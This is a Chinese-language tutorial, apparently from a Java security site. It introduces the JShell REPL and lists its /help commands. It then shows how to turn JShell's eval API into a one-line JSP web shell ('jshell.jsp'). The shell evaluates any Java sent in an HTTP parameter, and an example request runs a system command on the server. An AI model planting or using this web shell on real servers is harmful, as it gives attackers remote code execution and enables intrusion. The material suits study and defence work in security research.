# JShell

从`Java 9`开始提供了一个叫`jshell`的功能，`jshell`是一个`REPL(Read-Eval-Print Loop)`命令行工具，提供了一个交互式命令行界面，在`jshell`中我们不再需要编写类也可以执行Java代码片段，开发者可以像`python`和`php`一样在命令行下愉快的写测试代码了。

命令行执行`jshell`即可进入`jshell`模式：

![img](https://oss.javasec.org/images/image-20191219163053592.png)

输入:`/help`可以查看具体的命令:

```bash
|  键入 Java 语言表达式, 语句或声明。
|  或者键入以下命令之一:
|  /list [<名称或 id>|-all|-start]
|  	列出您键入的源
|  /edit <名称或 id>
|  	编辑按名称或 id 引用的源条目
|  /drop <名称或 id>
|  	删除按名称或 id 引用的源条目
|  /save [-all|-history|-start] <文件>
|  	将片段源保存到文件。
|  /open <file>
|  	打开文件作为源输入
|  /vars [<名称或 id>|-all|-start]
|  	列出已声明变量及其值
|  /methods [<名称或 id>|-all|-start]
|  	列出已声明方法及其签名
|  /types [<名称或 id>|-all|-start]
|  	列出已声明的类型
|  /imports 
|  	列出导入的项
|  /exit 
|  	退出 jshell
|  /env [-class-path <路径>] [-module-path <路径>] [-add-modules <模块>] ...
|  	查看或更改评估上下文
|  /reset [-class-path <路径>] [-module-path <路径>] [-add-modules <模块>]...
|  	重启 jshell
|  /reload [-restore] [-quiet] [-class-path <路径>] [-module-path <路径>]...
|  	重置和重放相关历史记录 -- 当前历史记录或上一个历史记录 (-restore)
|  /history 
|  	您键入的内容的历史记录
|  /help [<command>|<subject>]
|  	获取 jshell 的相关信息
|  /set editor|start|feedback|mode|prompt|truncation|format ...
|  	设置 jshell 配置信息
|  /? [<command>|<subject>]
|  	获取 jshell 的相关信息
|  /! 
|  	重新运行上一个片段
|  /<id> 
|  	按 id 重新运行片段
|  /-<n> 
|  	重新运行前面的第 n 个片段
|  
|  有关详细信息, 请键入 '/help', 后跟
|  命令或主题的名称。
|  例如 '/help /list' 或 '/help intro'。主题:
|  
|  intro
|  	jshell 工具的简介
|  shortcuts
|  	片段和命令输入提示, 信息访问以及
|  	自动代码生成的按键说明
|  context
|  	/env /reload 和 /reset 的评估上下文选项
```

## 使用JShell执行代码片段

`jshell`不仅是一个命令行工具，在我们的应用程序中同样也可以调用`jshell`内部的实现API，也就是说我们可以利用`jshell`来执行Java代码片段而不再需要将Java代码编译成class文件后执行了。

`jshell`调用了`jdk.jshell.JShell`类的`eval`方法来执行我们的代码片段，那么我们只要想办法调用这个`eval`方法也就可以实现真正意义上的一句话木马了。

**`jshell.jsp`一句话木马示例:**

```jsp
<%=jdk.jshell.JShell.builder().build().eval(request.getParameter("src"))%>
```

程序执行后会输出一些不必要的信息，如果有强迫症可以修改为：

```jsp
<%=jdk.jshell.JShell.builder().build().eval(request.getParameter("src")).get(0).value().replaceAll("^\"", "").replaceAll("\"$", "")%>
```

然后我们需要编写一个执行本地命令的代码片段：

```java
new String(Runtime.getRuntime().exec("pwd").getInputStream().readAllBytes())
```

`Java 9`的`java.io.InputStream`类正好提供了一个`readAllBytes`方法，我们从此以后再也不需要按字节读取了。

浏览器请求：http://localhost:8080/jshell.jsp?src=new%20String(Runtime.getRuntime().exec(%34pwd%34).getInputStream().readAllBytes())

程序执行结果：

![img](https://oss.javasec.org/images/image-20191219170956644.png)